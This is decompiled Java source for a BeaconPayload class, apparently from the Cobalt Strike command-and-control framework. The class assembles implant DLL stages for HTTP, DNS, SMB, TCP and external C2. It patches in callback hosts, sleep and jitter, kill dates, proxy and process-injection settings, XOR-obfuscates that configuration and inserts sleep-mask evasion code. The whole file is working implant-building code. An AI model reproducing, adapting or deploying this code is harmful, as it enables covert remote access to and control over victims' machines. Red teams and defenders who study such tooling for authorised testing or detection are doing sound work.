package beacon;

import aggressor.AggressorClient;
import beacon.setup.BeaconDLL;
import beacon.setup.ProcessInject;
import c2profile.Profile;
import common.AssertUtils;
import common.CommonUtils;
import common.DevLog;
import common.MudgeSanity;
import common.Packer;
import common.ProxyServer;
import common.ScListener;
import common.SleevedResource;
import dialog.DialogUtils;
import dns.QuickSecurity;
import java.io.IOException;
import java.io.InputStream;
import java.util.Arrays;
import java.util.Collection;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.Stack;
import pe.MalleablePE;
import pe.OBJExecutable;
import pe.PEParser;
import sleep.runtime.SleepUtils;

public class BeaconPayload extends BeaconConstants {
   public static final int EXIT_FUNC_PROCESS = 0;
   public static final int EXIT_FUNC_THREAD = 1;
   private final int D = 769;
   protected Profile c2profile = null;
   protected MalleablePE pe = null;
   protected byte[] publickey = new byte[0];
   protected ScListener listener = null;
   protected int funk = 0;
   protected String arch = null;
   protected AggressorClient client = null;

   public BeaconPayload(ScListener var1, AggressorClient var2, String var3, int var4) {
      this.listener = var1;
      this.c2profile = var1.getProfile();
      this.publickey = var1.getPublicKey();
      this.pe = new MalleablePE(this.c2profile);
      this.funk = var4;
      this.arch = var3;
      this.client = var2;
   }

   public static byte[] beacon_obfuscate(byte[] var0) {
      byte[] var1 = new byte[var0.length];

      for(int var2 = 0; var2 < var0.length; ++var2) {
         var1[var2] = (byte)(var0[var2] ^ 94);
      }

      return var1;
   }

   public BeaconDLL exportBeaconStageHTTP(int var1, String var2, boolean var3, boolean var4) {
      AssertUtils.TestSetValue(this.arch, "x86, x64");
      String var5 = "";
      if ("x86".equals(this.arch)) {
         var5 = "resources/beacon.dll";
      } else if ("x64".equals(this.arch)) {
         var5 = "resources/beacon.x64.dll";
      }

      DevLog.log(DevLog.STORY.CS0216_TEST, this.getClass(), "exportBeaconStageHTTP", "Using BeaconDLL 001");
      BeaconDLL var6 = new BeaconDLL(var5);
      var6.originalDLL = this.exportBeaconStage(var1, var2, var3, var4, var5);
      var6.peProcessedDLL = this.pe.process(var6.originalDLL, this.arch);
      if (this.client == null) {
         DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportBeaconStageHTTP", "Using Default Loader: " + var6.fileName);
      } else {
         var6.setCustomLoaderSize(this.listener.getCustomLoaderSizeKB(this.client, var5, this.arch));
         if (var6.usesCustomLoaderSize()) {
            if ("x86".equals(this.arch)) {
               var6.customFileName = "resources/beacon" + var6.getCustomLoaderExtension() + ".dll";
            } else if ("x64".equals(this.arch)) {
               var6.customFileName = "resources/beacon.x64" + var6.getCustomLoaderExtension() + ".dll";
            }

            DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportBeaconStageHTTP", "Using Custom Ref Loader: " + var6.customFileName);
            var6.customDLL = this.exportBeaconStage(var1, var2, var3, var4, var6.customFileName);
         }
      }

      return var6;
   }

   public BeaconDLL exportBeaconStageDNS(int var1, String var2, boolean var3, boolean var4) {
      AssertUtils.TestSetValue(this.arch, "x86, x64");
      String var5 = "";
      if ("x86".equals(this.arch)) {
         var5 = "resources/dnsb.dll";
      } else if ("x64".equals(this.arch)) {
         var5 = "resources/dnsb.x64.dll";
      }

      DevLog.log(DevLog.STORY.CS0216_TEST, this.getClass(), "exportBeaconStageDNS", "Using BeaconDLL 002");
      BeaconDLL var6 = new BeaconDLL(var5);
      var6.originalDLL = this.exportBeaconStage(var1, var2, var3, var4, var5);
      var6.peProcessedDLL = this.pe.process(var6.originalDLL, this.arch);
      if (this.client == null) {
         DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportBeaconStageDNS", "Using Default Loader: " + var6.fileName);
      } else {
         var6.setCustomLoaderSize(this.listener.getCustomLoaderSizeKB(this.client, var5, this.arch));
         if (var6.usesCustomLoaderSize()) {
            if ("x86".equals(this.arch)) {
               var6.customFileName = "resources/dnsb" + var6.getCustomLoaderExtension() + ".dll";
            } else if ("x64".equals(this.arch)) {
               var6.customFileName = "resources/dnsb.x64" + var6.getCustomLoaderExtension() + ".dll";
            }

            DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportBeaconStageDNS", "Using Custom Ref Loader: " + var6.customFileName);
            var6.customDLL = this.exportBeaconStage(var1, var2, var3, var4, var6.customFileName);
         }
      }

      return var6;
   }

   protected void setupKillDate(Settings var1) {
      var1.addShort(55, this.funk);
      if (!this.c2profile.hasString(".killdate")) {
         var1.addInt(40, 0);
      } else {
         String var2 = this.c2profile.getString(".killdate");
         String[] var3 = var2.split("-");
         int var4 = (short)CommonUtils.toNumber(var3[0], 0) * 10000;
         int var5 = (short)CommonUtils.toNumber(var3[1], 0) * 100;
         short var6 = (short)CommonUtils.toNumber(var3[2], 0);
         var1.addInt(40, var4 + var5 + var6);
      }
   }

   public static void setupPivotFrames(Profile var0, Settings var1) {
      byte[] var2 = CommonUtils.toBytes(var0.getString(".tcp_frame_header"));
      byte[] var3 = CommonUtils.toBytes(var0.getString(".smb_frame_header"));
      Packer var4 = new Packer();
      var4.addShort(var2.length + 4);
      var4.append(var2);
      var1.addData(58, var4.getBytes(), 128);
      var4 = new Packer();
      var4.addShort(var3.length + 4);
      var4.append(var3);
      var1.addData(57, var4.getBytes(), 128);
   }

   protected void setupGargle(Settings var1, String var2) throws IOException {
      if (!this.c2profile.option(".stage.sleep_mask")) {
         var1.addInt(41, 0);
      } else {
         PEParser var3 = PEParser.load(SleevedResource.readResource(var2));
         boolean var4 = this.c2profile.option(".stage.obfuscate");
         boolean var5 = this.c2profile.option(".stage.userwx");
         var1.addInt(41, 1);
         Packer var6 = new Packer();
         var6.little();
         if (!var4) {
            var6.addInt(0);
            var6.addInt(4096);
         }

         Iterator var7 = var3.SectionsTable().iterator();

         while(var7.hasNext()) {
            String var8 = (String)var7.next();
            if (".text".equals(var8)) {
               if (var5) {
                  var6.addInt(var3.sectionAddress(var8));
                  var6.addInt(-1);
                  var6.addInt(-1);
                  var6.addInt(var3.sectionEnd(var8));
               }
            } else {
               var6.addInt(var3.sectionAddress(var8));
               var6.addInt(var3.sectionEnd(var8));
            }
         }

         var6.addInt(0);
         var6.addInt(0);
         var1.addData(42, var6.getBytes(), (int)var6.size());
      }
   }

   protected void setupMaxRetryStrategy(Settings var1, String var2) {
      if (var2.matches("exit-\\d+-\\d+-\\d+[m,h,d]")) {
         String[] var3 = var2.split("-");
         int var4 = CommonUtils.toNumber(var3[1], 0);
         int var5 = CommonUtils.toNumber(var3[2], 0);
         char var6 = var3[3].charAt(var3[3].length() - 1);
         int var7 = CommonUtils.toNumber(var3[3].substring(0, var3[3].length() - 1), 0);
         int var8 = 60;
         if (var6 == 'h') {
            var8 = 3600;
         } else if (var6 == 'd') {
            var8 = 86400;
         }

         if (var4 > 0 && var7 > 0) {
            var1.addInt(71, var4);
            var1.addInt(72, var5);
            var1.addInt(73, var7 * var8);
            return;
         }
      }

      if (!var2.equals("none")) {
         String var9 = "Max retry strategy '" + var2 + "' is not valid, defaulting to none";
         CommonUtils.print_warn(var9);
         DialogUtils.showInfo(var9);
      }

      var1.addInt(71, 0);
      var1.addInt(72, 0);
      var1.addInt(73, 0);
   }

   protected void setupDNS(Settings var1) throws IOException {
      int var2 = Integer.parseInt(this.c2profile.getString(".dns-beacon.maxdns"));
      if (var2 < 0 || var2 > 255) {
         var2 = 255;
      }

      long var3 = CommonUtils.ipToLong(this.c2profile.getString(".dns-beacon.dns_idle"));
      int var5 = Integer.parseInt(this.c2profile.getString(".dns-beacon.dns_sleep"));
      var1.addShort(6, var2);
      var1.addInt(19, (int)var3);
      var1.addInt(20, var5);
      String var6 = this.c2profile.getString(".dns-beacon.beacon");
      String var7 = this.A(this.c2profile.getString(".dns-beacon.get_A"), "cdn.");
      String var8 = this.A(this.c2profile.getString(".dns-beacon.get_AAAA"), "www6.");
      String var9 = this.A(this.c2profile.getString(".dns-beacon.get_TXT"), "api.");
      String var10 = this.A(this.c2profile.getString(".dns-beacon.put_metadata"), "www.");
      String var11 = this.A(this.c2profile.getString(".dns-beacon.put_output"), "post.");
      var1.addString(60, var6, 33);
      var1.addString(61, var7, 33);
      var1.addString(62, var8, 33);
      var1.addString(63, var9, 33);
      var1.addString(64, var10, 33);
      var1.addString(65, var11, 33);
      var1.addString(66, this.listener.getDNSResolverString(), 15);
   }

   private String A(String var1, String var2) {
      return var1 != null && !"".equals(var1) ? var1 : var2;
   }

   protected void setupHTTP(Settings var1) throws IOException {
      String var2 = randua(this.c2profile);
      String var3 = CommonUtils.pick(this.c2profile.getString(".http-post.uri").split(" "));
      byte[] var4 = this.c2profile.recover_binary(".http-get.server.output");
      byte[] var5 = this.c2profile.apply_binary(".http-get.client");
      byte[] var6 = this.c2profile.apply_binary(".http-post.client");
      var1.addString(9, var2, 256);
      var1.addString(10, var3, 64);
      var1.addData(11, var4, 256);
      var1.addData(12, var5, 512);
      var1.addData(13, var6, 512);
      String var7 = this.c2profile.getHeadersToRemove();
      if (var7.length() > 0) {
         var1.addString(59, var7, 64);
      }

   }

   protected byte[] findSleepMaskCode(String var1) {
      int var2 = this.arch.equals("x64") ? 769 : 769;
      int var3 = var1.equals("tcp") ? 4 : 8;
      byte[] var4 = new byte[var2];

      for(int var5 = 0; var5 < var4.length; ++var5) {
         var4[var5] = (byte)(var5 % var3 == 0 ? -52 : -112);
      }

      if (this.arch.equals("x64")) {
         var4[var4.length - 1] = -61;
      } else {
         var4[var4.length - 1] = -61;
      }

      return var4;
   }

   private byte[] A(String var1) {
      if (this.client == null) {
         return null;
      } else {
         Stack var2 = new Stack();
         var2.push(SleepUtils.getScalar(this.arch));
         var2.push(SleepUtils.getScalar(var1));
         String var3 = this.client.getScriptEngine().format("BEACON_SLEEP_MASK", var2);
         if (var3 != null) {
            if (var3.length() > 0 && var3.length() <= 769) {
               return CommonUtils.toBytes(var3);
            }

            CommonUtils.print_warn("The user provided sleep mask for the '" + var1 + "' type has a size of " + var3.length() + " bytes, which exceeds the max size limit. The default sleep mask will be used.");
         }

         return null;
      }
   }

   private byte[] B(String var1) {
      String var2;
      if (var1.equals("default")) {
         var2 = "resources/sleepmask." + this.arch + ".o";
      } else {
         var2 = "resources/sleepmask_" + var1 + "." + this.arch + ".o";
      }

      byte[] var3 = SleevedResource.readResource(var2);
      OBJExecutable var4 = new OBJExecutable(var3, "_gargle_it");
      var4.parse();
      return var4.getCode();
   }

   private byte[] A(byte[] var1) {
      int var2 = 0;

      for(int var3 = var1.length - 1; var3 >= 0 && var1[var3] == -112; --var3) {
         ++var2;
      }

      if (var2 > 0) {
         var1 = Arrays.copyOf(var1, var1.length - var2);
      }

      return var1;
   }

   protected byte[] patchSleepMask(byte[] var1, String var2) {
      AssertUtils.TestSetValue(var2, "default, smb, tcp");
      byte[] var3 = this.findSleepMaskCode(var2);
      byte[] var4 = this.A(var2);
      if (var4 == null) {
         var4 = this.B(var2);
      }

      var4 = this.A(var4);
      byte[] var5 = new byte[var3.length];

      for(int var6 = 0; var6 < var3.length; ++var6) {
         var5[var6] = var4[var6 % var4.length];
      }

      return CommonUtils.patch(var1, var3, var5, var5.length);
   }

   protected byte[] exportBeaconStage(int var1, String var2, boolean var3, boolean var4, String var5) {
      try {
         long var6 = System.currentTimeMillis();
         byte[] var8 = SleevedResource.readResource(var5);
         String[] var9 = this.c2profile.getString(".http-get.uri").split(" ");
         String[] var10 = var2.split(",\\s*");
         LinkedList var11 = new LinkedList();

         for(int var12 = 0; var12 < var10.length; ++var12) {
            var11.add(var10[var12]);
            var11.add(CommonUtils.pick(var9));
         }

         String var28 = this.listener.getStrategy();
         int var13 = BeaconConstants.getStrategyID(var28);
         if (var28.startsWith("rotate") || var28.startsWith("failover")) {
            var13 = 2;
         }

         int var14 = -1;
         if (var28.startsWith("rotate")) {
            var14 = BeaconConstants.parseStrategyForNumber(var28, "rotate");
         }

         int var15 = -1;
         if (var28.equals("failover")) {
            var15 = 0;
         } else if (var28.startsWith("failover") && var28.endsWith("x")) {
            var15 = BeaconConstants.parseStrategyForNumber(var28, "failover");
         }

         int var16 = -1;
         if (var28.startsWith("failover") && (var28.endsWith("s") || var28.endsWith("m") || var28.endsWith("h") || var28.endsWith("d"))) {
            var16 = BeaconConstants.parseStrategyForNumber(var28, "failover");
         }

         while(var11.size() > 2 && CommonUtils.join((Collection)var11, (String)",").length() > 255) {
            String var17 = var11.removeLast() + "";
            String var18 = var11.removeLast() + "";
            CommonUtils.print_info("dropping " + var18 + var17 + " from Beacon profile for size");
         }

         int var29 = Integer.parseInt(this.c2profile.getString(".sleeptime"));
         int var30 = this.c2profile.size(".http-get.server.output", 1048576);
         int var19 = Integer.parseInt(this.c2profile.getString(".jitter"));
         if (var19 < 0 || var19 > 99) {
            var19 = 0;
         }

         int var20 = 0;
         if (var3) {
            var20 |= 1;
         }

         if (var4) {
            var20 |= 8;
         }

         Settings var21 = new Settings();
         var21.addShort(1, var20);
         var21.addShort(2, var1);
         var21.addInt(3, var29);
         var21.addInt(4, var30);
         var21.addShort(5, var19);
         var21.addData(7, this.publickey, 256);
         var21.addString(8, CommonUtils.join((Collection)var11, (String)","), 256);
         var21.addShort(67, var13);
         var21.addInt(68, var14);
         var21.addInt(69, var15);
         var21.addInt(70, var16);
         var21.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
         var21.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
         var21.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
         var21.addShort(31, QuickSecurity.getCryptoScheme());
         var21.addString(26, this.c2profile.getString(".http-get.verb"), 16);
         var21.addString(27, this.c2profile.getString(".http-post.verb"), 16);
         var21.addInt(28, this.c2profile.shouldChunkPosts() ? 96 : 0);
         var21.addInt(37, this.c2profile.getInt(".watermark"));
         var21.addString(36, this.c2profile.getString(".watermarkHash"), 32);
         var21.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
         var21.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
         this.setupMaxRetryStrategy(var21, this.listener.getMaxRetryStrategy());
         if (var3) {
            this.setupDNS(var21);
         } else {
            this.setupHTTP(var21);
         }

         String var22 = this.listener.getHostHeader();
         if (var22 != null && var22.length() != 0) {
            if (Profile.usesHostBeacon(this.c2profile)) {
               var21.addString(54, "", 128);
            } else {
               var21.addString(54, "Host: " + this.listener.getHostHeader() + "\r\n", 128);
            }
         } else {
            var21.addString(54, "", 128);
         }

         if (Profile.usesCookieBeacon(this.c2profile)) {
            var21.addShort(50, 1);
         } else {
            var21.addShort(50, 0);
         }

         ProxyServer var23 = ProxyServer.parse(this.listener.getProxyString());
         var23.setup(var21);
         setupPivotFrames(this.c2profile, var21);
         this.setupKillDate(var21);
         this.setupGargle(var21, var5);
         (new ProcessInject(this.c2profile)).apply(var21);
         byte[] var24 = var21.toPatch();
         var24 = beacon_obfuscate(var24);
         var8 = this.patchSleepMask(var8, "default");
         String var25 = CommonUtils.bString(var8);
         int var26 = var25.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
         var25 = CommonUtils.replaceAt(var25, CommonUtils.bString(var24), var26);
         return CommonUtils.toBytes(var25);
      } catch (IOException var27) {
         MudgeSanity.logException("export Beacon stage: " + var5, var27, false);
         return new byte[0];
      }
   }

   public BeaconDLL exportReverseTCPStage() {
      DevLog.log(DevLog.STORY.CS0216_TEST, this.getClass(), "exportReverseTCPStage", "Using BeaconDLL 005");
      BeaconDLL var1 = new BeaconDLL();
      if (this.arch.equals("x64")) {
         var1.fileName = "resources/pivot.x64.dll";
      } else {
         var1.fileName = "resources/pivot.dll";
      }

      var1.originalDLL = this.exportTCPDLL(var1.fileName, "reverse");
      var1.peProcessedDLL = this.pe.process(var1.originalDLL, this.arch);
      if (this.client == null) {
         DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportReverseTCPStage", "Using Default Loader: " + var1.fileName);
      } else {
         var1.setCustomLoaderSize(this.listener.getCustomLoaderSizeKB(this.client, var1.fileName, this.arch));
         if (var1.usesCustomLoaderSize()) {
            if ("x86".equals(this.arch)) {
               var1.customFileName = "resources/pivot" + var1.getCustomLoaderExtension() + ".dll";
            } else if ("x64".equals(this.arch)) {
               var1.customFileName = "resources/pivot.x64" + var1.getCustomLoaderExtension() + ".dll";
            }

            DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportReverseTCPStage", "Using Custom Ref Loader: " + var1.customFileName);
            var1.customDLL = this.exportTCPDLL(var1.customFileName, "reverse");
         }
      }

      return var1;
   }

   public BeaconDLL exportBindTCPStage() {
      DevLog.log(DevLog.STORY.CS0216_TEST, this.getClass(), "exportBindTCPStage", "Using BeaconDLL 006");
      BeaconDLL var1 = new BeaconDLL();
      if (this.arch.equals("x64")) {
         var1.fileName = "resources/pivot.x64.dll";
      } else {
         var1.fileName = "resources/pivot.dll";
      }

      var1.originalDLL = this.exportTCPDLL(var1.fileName, "bind");
      var1.peProcessedDLL = this.pe.process(var1.originalDLL, this.arch);
      if (this.client == null) {
         DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportBindTCPStage", "Using Default Loader: " + var1.fileName);
      } else {
         var1.setCustomLoaderSize(this.listener.getCustomLoaderSizeKB(this.client, var1.fileName, this.arch));
         if (var1.usesCustomLoaderSize()) {
            if (this.arch.equals("x64")) {
               var1.customFileName = "resources/pivot.x64" + var1.getCustomLoaderExtension() + ".dll";
            } else {
               var1.customFileName = "resources/pivot" + var1.getCustomLoaderExtension() + ".dll";
            }

            DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportBindTCPStage", "Using Custom Ref Loader: " + var1.customFileName);
            var1.customDLL = this.exportTCPDLL(var1.customFileName, "bind");
         }
      }

      return var1;
   }

   public BeaconDLL exportSMBStage() {
      DevLog.log(DevLog.STORY.CS0216_TEST, this.getClass(), "exportSMBStage", "Using BeaconDLL 003");
      BeaconDLL var1 = new BeaconDLL();
      if (this.arch.equals("x64")) {
         var1.fileName = "resources/pivot.x64.dll";
      } else {
         var1.fileName = "resources/pivot.dll";
      }

      var1.originalDLL = this.exportSMBDLL(var1.fileName, false);
      var1.peProcessedDLL = this.pe.process(var1.originalDLL, this.arch);
      var1.setCustomLoaderSize(this.listener.getCustomLoaderSizeKB(this.client, var1.fileName, this.arch));
      if (this.client == null) {
         DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportSMBStage", "Using Default Loader: " + var1.fileName);
      } else if (var1.usesCustomLoaderSize()) {
         if (this.arch.equals("x64")) {
            var1.customFileName = "resources/pivot.x64" + var1.getCustomLoaderExtension() + ".dll";
         } else {
            var1.customFileName = "resources/pivot" + var1.getCustomLoaderExtension() + ".dll";
         }

         DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportSMBStage", "Using Custom Ref Loader: " + var1.customFileName);
         var1.customDLL = this.exportSMBDLL(var1.customFileName, false);
      }

      return var1;
   }

   public BeaconDLL exportExternalC2Stage() {
      DevLog.log(DevLog.STORY.CS0216_TEST, this.getClass(), "exportExternalC2Stage", "Using BeaconDLL 004");
      BeaconDLL var1 = new BeaconDLL();
      if (this.arch.equals("x64")) {
         var1.fileName = "resources/extc2.x64.dll";
      } else {
         var1.fileName = "resources/extc2.dll";
      }

      var1.originalDLL = this.exportSMBDLL(var1.fileName, true);
      var1.peProcessedDLL = this.pe.process(var1.originalDLL, this.arch);
      if (this.client == null) {
         DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportExternalC2Stage", "Using Default Loader: " + var1.fileName);
      } else {
         var1.setCustomLoaderSize(this.listener.getCustomLoaderSizeKB(this.client, var1.fileName, this.arch));
         if (var1.usesCustomLoaderSize()) {
            if (this.arch.equals("x64")) {
               var1.customFileName = "resources/extc2.x64" + var1.getCustomLoaderExtension() + ".dll";
            } else {
               var1.customFileName = "resources/extc2" + var1.getCustomLoaderExtension() + ".dll";
            }

            DevLog.log(DevLog.STORY.CS0541, this.getClass(), "exportExternalC2Stage", "Using Custom Ref Loader: " + var1.customFileName);
            var1.customDLL = this.exportSMBDLL(var1.customFileName, true);
         }
      }

      return var1;
   }

   public byte[] exportSMBDLL(String var1, boolean var2) {
      try {
         long var3 = System.currentTimeMillis();
         byte[] var5 = SleevedResource.readResource(var1);
         String var6 = this.listener.getPipeName(".");
         Settings var7 = new Settings();
         var7.addShort(1, 2);
         var7.addShort(2, 4444);
         var7.addInt(3, 10000);
         var7.addInt(4, 1048576);
         var7.addShort(5, 0);
         var7.addShort(6, 0);
         var7.addData(7, this.publickey, 256);
         var7.addString(8, "", 256);
         var7.addString(9, "", 128);
         var7.addString(10, "", 64);
         var7.addString(11, "", 256);
         var7.addString(12, "", 256);
         var7.addString(13, "", 256);
         var7.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
         var7.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
         var7.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
         var7.addString(15, var6, 128);
         var7.addShort(31, QuickSecurity.getCryptoScheme());
         this.setupKillDate(var7);
         var7.addInt(37, this.c2profile.getInt(".watermark"));
         var7.addString(36, this.c2profile.getString(".watermarkHash"), 32);
         var7.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
         var7.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
         this.setupGargle(var7, var1);
         setupPivotFrames(this.c2profile, var7);
         (new ProcessInject(this.c2profile)).apply(var7);
         byte[] var8 = var7.toPatch();
         var8 = beacon_obfuscate(var8);
         if (!var2) {
            var5 = this.patchSleepMask(var5, "tcp");
         }

         var5 = this.patchSleepMask(var5, "smb");
         String var9 = CommonUtils.bString(var5);
         int var10 = var9.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
         var9 = CommonUtils.replaceAt(var9, CommonUtils.bString(var8), var10);
         return CommonUtils.toBytes(var9);
      } catch (IOException var11) {
         MudgeSanity.logException("export SMB DLL", var11, false);
         return new byte[0];
      }
   }

   public byte[] exportTCPDLL(String var1, String var2) {
      AssertUtils.TestSetValue(var2, "bind, reverse");

      try {
         long var3 = System.currentTimeMillis();
         byte[] var5 = SleevedResource.readResource(var1);
         Settings var6 = new Settings();
         if ("bind".equals(var2)) {
            var6.addShort(1, 16);
         } else {
            var6.addShort(1, 4);
         }

         var6.addShort(2, this.listener.getPort());
         var6.addInt(3, 10000);
         var6.addInt(4, 1048576);
         var6.addShort(5, 0);
         var6.addShort(6, 0);
         var6.addData(7, this.publickey, 256);
         if ("bind".equals(var2)) {
            if (this.listener.isLocalHostOnly()) {
               var6.addInt(49, (int)CommonUtils.ipToLong("127.0.0.1"));
            } else {
               var6.addInt(49, (int)CommonUtils.ipToLong("0.0.0.0"));
            }
         } else {
            var6.addString(8, this.listener.getStagerHost(), 256);
         }

         var6.addString(9, "", 128);
         var6.addString(10, "", 64);
         var6.addString(11, "", 256);
         var6.addString(12, "", 256);
         var6.addString(13, "", 256);
         var6.addData(14, CommonUtils.asBinary(this.c2profile.getString(".spawnto")), 16);
         var6.addString(29, this.c2profile.getString(".post-ex.spawnto_x86"), 64);
         var6.addString(30, this.c2profile.getString(".post-ex.spawnto_x64"), 64);
         var6.addString(15, "", 128);
         var6.addShort(31, QuickSecurity.getCryptoScheme());
         this.setupKillDate(var6);
         var6.addInt(37, this.c2profile.getInt(".watermark"));
         var6.addString(36, this.c2profile.getString(".watermarkHash"), 32);
         var6.addShort(38, this.c2profile.option(".stage.cleanup") ? 1 : 0);
         var6.addShort(39, this.c2profile.exerciseCFGCaution() ? 1 : 0);
         this.setupGargle(var6, var1);
         setupPivotFrames(this.c2profile, var6);
         (new ProcessInject(this.c2profile)).apply(var6);
         byte[] var7 = var6.toPatch();
         var7 = beacon_obfuscate(var7);
         var5 = this.patchSleepMask(var5, "tcp");
         var5 = this.patchSleepMask(var5, "smb");
         String var8 = CommonUtils.bString(var5);
         int var9 = var8.indexOf("AAAABBBBCCCCDDDDEEEEFFFF");
         var8 = CommonUtils.replaceAt(var8, CommonUtils.bString(var7), var9);
         return CommonUtils.toBytes(var8);
      } catch (IOException var10) {
         MudgeSanity.logException("export TCP DLL", var10, false);
         return new byte[0];
      }
   }

   public static String randua(Profile var0) {
      if (var0.getString(".useragent").equals("<RAND>")) {
         try {
            InputStream var1 = CommonUtils.resource("resources/ua.txt");
            String var2 = CommonUtils.pick(CommonUtils.bString(CommonUtils.readAll(var1)).split("\n"));
            var1.close();
            return var2;
         } catch (IOException var3) {
            MudgeSanity.logException("randua", var3, false);
            return "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)";
         }
      } else {
         return var0.getString(".useragent");
      }
   }
}
